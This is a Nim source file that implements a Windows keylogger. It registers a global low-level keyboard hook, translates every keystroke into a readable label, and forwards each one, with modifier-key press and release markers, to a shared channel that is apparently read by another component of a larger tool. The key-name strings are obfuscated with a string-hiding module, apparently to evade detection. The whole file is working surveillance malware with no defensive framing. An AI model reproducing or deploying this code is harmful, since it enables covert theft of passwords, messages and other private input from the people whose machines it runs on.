from tables import `[]`
from tables import toTable

from os import sleep

from winim/inc/windef import WPARAM
from winim/inc/windef import LPARAM
from winim/inc/windef import LRESULT
from winim/inc/windef import DWORD
from winim/inc/windef import HHOOK


from winim/inc/winuser import PKBDLLHOOKSTRUCT
from winim/inc/winuser import KBDLLHOOKSTRUCT
from winim/inc/winuser import WM_KEYDOWN
from winim/inc/winuser import WM_SYSKEYDOWN
from winim/inc/winuser import WM_KEYUP
from winim/inc/winuser import WM_SYSKEYUP
from winim/inc/winuser import VK_CONTROL
from winim/inc/winuser import VK_LCONTROL
from winim/inc/winuser import VK_RCONTROL
from winim/inc/winuser import VK_SHIFT
from winim/inc/winuser import VK_RSHIFT
from winim/inc/winuser import VK_LSHIFT
from winim/inc/winuser import VK_MENU
from winim/inc/winuser import VK_LMENU
from winim/inc/winuser import VK_RMENU
from winim/inc/winuser import VK_CAPITAL
from winim/inc/winuser import VK_NUMLOCK
from winim/inc/winuser import VK_LWIN
from winim/inc/winuser import VK_RWIN
from winim/inc/winuser import CallNextHookEx
from winim/inc/winuser import SetWindowsHookEx
from winim/inc/winuser import WH_KEYBOARD_LL
from winim/inc/winuser import HOOKPROC
from winim/inc/winuser import MSG
from winim/inc/winuser import GetMessage

from winim/utils import winimConverterBOOLToBoolean

import ../functions/hideString

from ../channels import mainChannel

## sursa: http://www.kbdedit.com/manual/low_level_vk_list.html
const keys = {
    # "Mappable" codes
  e 0xC1: e"[ABNT C1]",             # VK_ABNT_C1
  e 0xC2: e"[ABNT C2]",             # VK_ABNT_C2
  e 0x6B: e"[NUMPAD +]",            # VK_ADD
  e 0xF6: e"[ATTN]",                # VK_ATTN
  e 0x08: e"[BACKSPACE]",           # VK_BACK
  e 0x03: e"[BREAK]",               # VK_CANCEL
  e 0x0C: e"[CLEAR]",               # VK_CLEAR
  e 0xF7: e"[CR SEL]",              # VK_CRSEL
  e 0x6E: e"[NUMPAD .]",            # VK_DECIMAL
  e 0x6F: e"[NUMPAD /]",            # VK_DIVIDE
  e 0xF9: e"[ER EOF]",              # VK_EREOF
  e 0x1B: e"[ESC]",                 # VK_ESCAPE
  e 0x2B: e"[EXECUTE]",             # VK_EXECUTE
  e 0xF8: e"[EX SEL]",              # VK_EXSEL
  e 0xE6: e"[ICOCLR]",              # VK_ICO_CLEAR
  e 0xE3: e"[ICOHLP]",              # VK_ICO_HELP
  e 0x30: e"0",                     # VK_KEY_0
  e 0x31: e"1",                     # VK_KEY_1
  e 0x32: e"2",                     # VK_KEY_2
  e 0x33: e"3",                     # VK_KEY_3
  e 0x34: e"4",                     # VK_KEY_4
  e 0x35: e"5",                     # VK_KEY_5
  e 0x36: e"6",                     # VK_KEY_6
  e 0x37: e"7",                     # VK_KEY_7
  e 0x38: e"8",                     # VK_KEY_8
  e 0x39: e"9",                     # VK_KEY_9
  e 0x41: e"A",                     # VK_KEY_A
  e 0x42: e"B",                     # VK_KEY_B
  e 0x43: e"C",                     # VK_KEY_C
  e 0x44: e"D",                     # VK_KEY_D
  e 0x45: e"E",                     # VK_KEY_E
  e 0x46: e"F",                     # VK_KEY_F
  e 0x47: e"G",                     # VK_KEY_G
  e 0x48: e"H",                     # VK_KEY_H
  e 0x49: e"I",                     # VK_KEY_I
  e 0x4A: e"J",                     # VK_KEY_J
  e 0x4B: e"K",                     # VK_KEY_K
  e 0x4C: e"L",                     # VK_KEY_L
  e 0x4D: e"M",                     # VK_KEY_M
  e 0x4E: e"N",                     # VK_KEY_N
  e 0x4F: e"O",                     # VK_KEY_O
  e 0x50: e"P",                     # VK_KEY_P
  e 0x51: e"Q",                     # VK_KEY_Q
  e 0x52: e"R",                     # VK_KEY_R
  e 0x53: e"S",                     # VK_KEY_S
  e 0x54: e"T",                     # VK_KEY_T
  e 0x55: e"U",                     # VK_KEY_U
  e 0x56: e"V",                     # VK_KEY_V
  e 0x57: e"W",                     # VK_KEY_W
  e 0x58: e"X",                     # VK_KEY_X
  e 0x59: e"Y",                     # VK_KEY_Y
  e 0x5A: e"Z",                     # VK_KEY_Z
  e 0x6A: e"[NUMPAD *]",            # VK_MULTIPLY
  e 0xFC: e"[NONAME]",              # VK_NONAME
  e 0x60: e"[NUMPAD 0]",            # VK_NUMPAD0
  e 0x61: e"[NUMPAD 1]",            # VK_NUMPAD1
  e 0x62: e"[NUMPAD 2]",            # VK_NUMPAD2
  e 0x63: e"[NUMPAD 3]",            # VK_NUMPAD3
  e 0x64: e"[NUMPAD 4]",            # VK_NUMPAD4
  e 0x65: e"[NUMPAD 5]",            # VK_NUMPAD5
  e 0x66: e"[NUMPAD 6]",            # VK_NUMPAD6
  e 0x67: e"[NUMPAD 7]",            # VK_NUMPAD7
  e 0x68: e"[NUMPAD 8]",            # VK_NUMPAD8
  e 0x69: e"[NUMPAD 9]",            # VK_NUMPAD9
  e 0xBA: e"[OEM_1 (: ;)]",         # VK_OEM_1
  e 0xE2: e"[OEM_102 (&GT; &LT;)]", # VK_OEM_102
  e 0xBF: e"[OEM_2 (? /)]",         # VK_OEM_2
  e 0xC0: e"[OEM_3 (~ `)]",         # VK_OEM_3
  e 0xDB: e"[OEM_4 ({ [)]",         # VK_OEM_4
  e 0xDC: e"[OEM_5 (| \\)]",        # VK_OEM_5
  e 0xDD: e"[OEM_6 (} ])]",         # VK_OEM_6
  e 0xDE: e "[OEM_7 (\" ')]",       # VK_OEM_7
  e 0xDF: e"[OEM_8 (Â§ !)]",      # VK_OEM_8
  e 0xF0: e"[OEM ATTN]",            # VK_OEM_ATTN
  e 0xF3: e"[AUTO]",                # VK_OEM_AUTO
  e 0xE1: e"[AX]",                  # VK_OEM_AX
  e 0xF5: e"[BACK TAB]",            # VK_OEM_BACKTAB
  e 0xFE: e"[OEMCLR]",              # VK_OEM_CLEAR
  e 0xBC: e"[OEM_COMMA (&LT; ]",    # VK_OEM_COMMA
  e 0xF2: e"[COPY]",                # VK_OEM_COPY
  e 0xEF: e"[CU SEL]",              # VK_OEM_CUSEL
  e 0xF4: e"[ENLW]",                # VK_OEM_ENLW
  e 0xF1: e"[FINISH]",              # VK_OEM_FINISH
  e 0x95: e"[LOYA]",                # VK_OEM_FJ_LOYA
  e 0x93: e"[MASHU]",               # VK_OEM_FJ_MASSHOU
  e 0x96: e"[ROYA]",                # VK_OEM_FJ_ROYA
  e 0x94: e"[TOUROKU]",             # VK_OEM_FJ_TOUROKU
  e 0xEA: e"[JUMP]",                # VK_OEM_JUMP
  e 0xBD: e"[OEM_MINUS (_ -)]",     # VK_OEM_MINUS
  e 0xEB: e"[OEMPA1]",              # VK_OEM_PA1
  e 0xEC: e"[OEMPA2]",              # VK_OEM_PA2
  e 0xED: e"[OEMPA3]",              # VK_OEM_PA3
  e 0xBE: e"[OEM_PERIOD (&GT; .)]", # VK_OEM_PERIOD
  e 0xBB: e"[OEM_PLUS (+ =)]",      # VK_OEM_PLUS
  e 0xE9: e"[RESET]",               # VK_OEM_RESET
  e 0xEE: e"[WSCTRL]",              # VK_OEM_WSCTRL
  e 0xFD: e"[PA1]",                 # VK_PA1
  e 0xE7: e"[PACKET]",              # VK_PACKET
  e 0xFA: e"[PLAY]",                # VK_PLAY
  e 0xE5: e"[PROCESS]",             # VK_PROCESSKEY
  e 0x0D: e"[ENTER]",               # VK_RETURN
  e 0x29: e"[SELECT]",              # VK_SELECT
  e 0x6C: e"[SEPARATOR]",           # VK_SEPARATOR
  e 0x20: e"[SPACE]",               # VK_SPACE
  e 0x6D: e"[NUM -]",               # VK_SUBTRACT
  e 0x09: e"[TAB]",                 # VK_TAB
  e 0xFB: e"[ZOOM]",                # VK_ZOOM
  e 0xFF: e"[NO VK MAPPING]",       # VK__none_
  e 0x1E: e"[ACCEPT]",              # VK_ACCEPT
  e 0x5D: e"[CONTEXT MENU]",        # VK_APPS
  e 0xA6: e"[BROWSER BACK]",        # VK_BROWSER_BACK
  e 0xAB: e"[BROWSER FAVORITES]",   # VK_BROWSER_FAVORITES
  e 0xA7: e"[BROWSER FORWARD]",     # VK_BROWSER_FORWARD
  e 0xAC: e"[BROWSER HOME]",        # VK_BROWSER_HOME
  e 0xA8: e"[BROWSER REFRESH]",     # VK_BROWSER_REFRESH
  e 0xAA: e"[BROWSER SEARCH]",      # VK_BROWSER_SEARCH
  e 0xA9: e"[BROWSER STOP]",        # VK_BROWSER_STOP
  e 0x14: e"[CAPS LOCK]",           # VK_CAPITAL
  e 0x1C: e"[CONVERT]",             # VK_CONVERT
  e 0x2E: e"[DELETE]",              # VK_DELETE
  e 0x28: e"[ARROW DOWN]",          # VK_DOWN
  e 0x23: e"[END]",                 # VK_END
  e 0x70: e"[F1]",                  # VK_F1
  e 0x79: e"[F10]",                 # VK_F10
  e 0x7A: e"[F11]",                 # VK_F11
  e 0x7B: e"[F12]",                 # VK_F12
  e 0x7C: e"[F13]",                 # VK_F13
  e 0x7D: e"[F14]",                 # VK_F14
  e 0x7E: e"[F15]",                 # VK_F15
  e 0x7F: e"[F16]",                 # VK_F16
  e 0x80: e"[F17]",                 # VK_F17
  e 0x81: e"[F18]",                 # VK_F18
  e 0x82: e"[F19]",                 # VK_F19
  e 0x71: e"[F2]",                  # VK_F2
  e 0x83: e"[F20]",                 # VK_F20
  e 0x84: e"[F21]",                 # VK_F21
  e 0x85: e"[F22]",                 # VK_F22
  e 0x86: e"[F23]",                 # VK_F23
  e 0x87: e"[F24]",                 # VK_F24
  e 0x72: e"[F3]",                  # VK_F3
  e 0x73: e"[F4]",                  # VK_F4
  e 0x74: e"[F5]",                  # VK_F5
  e 0x75: e"[F6]",                  # VK_F6
  e 0x76: e"[F7]",                  # VK_F7
  e 0x77: e"[F8]",                  # VK_F8
  e 0x78: e"[F9]",                  # VK_F9
  e 0x18: e"[FINAL]",               # VK_FINAL
  e 0x2F: e"[HELP]",                # VK_HELP
  e 0x24: e"[HOME]",                # VK_HOME
  e 0xE4: e"[ICO00]",               # VK_ICO_00
  e 0x2D: e"[INSERT]",              # VK_INSERT
  e 0x17: e"[JUNJA]",               # VK_JUNJA
  e 0x15: e"[KANA]",                # VK_KANA
  e 0x19: e"[KANJI]",               # VK_KANJI
  e 0xB6: e"[APP1]",                # VK_LAUNCH_APP1
  e 0xB7: e"[APP2]",                # VK_LAUNCH_APP2
  e 0xB4: e"[MAIL]",                # VK_LAUNCH_MAIL
  e 0xB5: e"[MEDIA]",               # VK_LAUNCH_MEDIA_SELECT
  e 0x01: e"[LEFT BUTTON]",         # VK_LBUTTON
  e 0xA2: e"[LEFT CTRL]",           # VK_LCONTROL
  e 0x25: e"[ARROW LEFT]",          # VK_LEFT
  e 0xA4: e"[LEFT ALT]",            # VK_LMENU
  e 0xA0: e"[LEFT SHIFT]",          # VK_LSHIFT
  e 0x5B: e"[LEFT WIN]",            # VK_LWIN
  e 0x04: e"[MIDDLE BUTTON]",       # VK_MBUTTON
  e 0xB0: e"[NEXT TRACK]",          # VK_MEDIA_NEXT_TRACK
  e 0xB3: e"[PLAY / PAUSE]",        # VK_MEDIA_PLAY_PAUSE
  e 0xB1: e"[PREVIOUS TRACK]",      # VK_MEDIA_PREV_TRACK
  e 0xB2: e"[STOP]",                # VK_MEDIA_STOP
  e 0x1F: e"[MODE CHANGE]",         # VK_MODECHANGE
  e 0x22: e"[PAGE DOWN]",           # VK_NEXT
  e 0x1D: e"[NON CONVERT]",         # VK_NONCONVERT
  e 0x90: e"[NUM LOCK]",            # VK_NUMLOCK
  e 0x92: e"[JISHO]",               # VK_OEM_FJ_JISHO
  e 0x13: e"[PAUSE]",               # VK_PAUSE
  e 0x2A: e"[PRINT]",               # VK_PRINT
  e 0x21: e"[PAGE UP]",             # VK_PRIOR
  e 0x02: e"[RIGHT BUTTON]",        # VK_RBUTTON
  e 0xA3: e"[RIGHT CTRL]",          # VK_RCONTROL
  e 0x27: e"[ARROW RIGHT]",         # VK_RIGHT
  e 0xA5: e"[RIGHT ALT]",           # VK_RMENU
  e 0xA1: e"[RIGHT SHIFT]",         # VK_RSHIFT
  e 0x5C: e"[RIGHT WIN]",           # VK_RWIN
  e 0x91: e"[SCROL LOCK]",          # VK_SCROLL
  e 0x5F: e"[SLEEP]",               # VK_SLEEP
  e 0x2C: e"[PRINT SCREEN]",        # VK_SNAPSHOT
  e 0x26: e"[ARROW UP]",            # VK_UP
  e 0xAE: e"[VOLUME DOWN]",         # VK_VOLUME_DOWN
  e 0xAD: e"[VOLUME MUTE]",         # VK_VOLUME_MUTE
  e 0xAF: e"[VOLUME UP]",           # VK_VOLUME_UP
  e 0x05: e"[X BUTTON 1]",          # VK_XBUTTON1
  e 0x06: e"[X BUTTON 2]"           # VK_XBUTTON2
}.toTable

var eHook: HHOOK

type processDataChannelType = tuple[key: DWORD, wparam: WPARAM]

var processDataChannel: Channel[processDataChannelType]

proc processDataThread(): void {.thread.} =
  while true:
    let channel: tuple[
      dataAvailable: bool,
      msg: processDataChannelType
      ] = processDataChannel.tryRecv()

    if channel.dataAvailable:
      let (key, wparam) = channel.msg
      let keyText: string = d keys[er key]

      if wparam == WM_KEYDOWN or wparam == WM_SYSKEYDOWN:
        mainChannel.send keyText

      elif wparam == WM_KEYUP or wparam == WM_SYSKEYUP:
        if key == VK_CONTROL or key == VK_LCONTROL or key == VK_RCONTROL or # ctrl
          key == VK_SHIFT or key == VK_RSHIFT or key == VK_LSHIFT or # shift
          key == VK_MENU or key == VK_LMENU or key == VK_RMENU or # alt
          key == VK_LWIN or key == VK_RWIN: # win

          var KeyName: string = keyText
          KeyName.insert("/", 1) # insert like [SHIFT] [a] [b] [/SHIFT]
          mainChannel.send KeyName

    sleep(10)

proc keyboardHandler(nCode: int32, wparam: WPARAM, lparam: LPARAM): LRESULT {.stdcall.} =
  if (nCode == 0):
    let kbs: PKBDLLHOOKSTRUCT = cast[ptr KBDLLHOOKSTRUCT](lparam)
    let key: DWORD = kbs.vkCode

    processDataChannel.send((key, wparam))

  result = CallNextHookEx(0, nCode, wparam, lparam)

proc initKeyloggerThread*(): void {.thread.} =

  open processDataChannel

  var processDataThreadVar: Thread[void]

  createThread(processDataThreadVar, processDataThread)

  eHook = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC keyboardHandler, 0, 0)

  var msg: MSG

  ## getMessage loop, am nev de asta ca altfel nu ruleaza procul
  while GetMessage(addr msg, 0, 0, 0):
    discard

  close processDataChannel
